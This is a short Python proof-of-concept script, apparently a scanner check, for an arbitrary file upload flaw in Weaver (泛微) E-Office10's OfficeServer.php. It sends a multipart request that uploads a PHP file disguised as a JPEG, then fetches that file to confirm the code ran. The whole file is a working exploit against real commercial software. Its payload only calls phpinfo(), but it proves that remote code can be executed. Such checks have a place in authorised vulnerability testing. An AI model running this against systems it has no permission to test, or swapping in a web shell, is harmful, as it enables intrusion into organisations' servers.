import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微E-Office10-OfficeServer任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Content-Length': '395',
        'Content-Type': 'image/jpeg',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }
    data = '''
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FileData"; filename="1.jpg"
Content-Type: image/jpeg
 
<?php phpinfo();unlink(__FILE__);?>
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FormData"
 
{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test112.php'}
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
    '''
    vurl = urllib.parse.urljoin(url, "/eoffice10/server/public/iWebOffice2015/OfficeServer.php")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200:
            vurl = f"{url}/eoffice10/server/public/iWebOffice2015/Document/test112.php"
            response = requests.get(vurl)
            if response.status_code == 200 and 'PHP' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult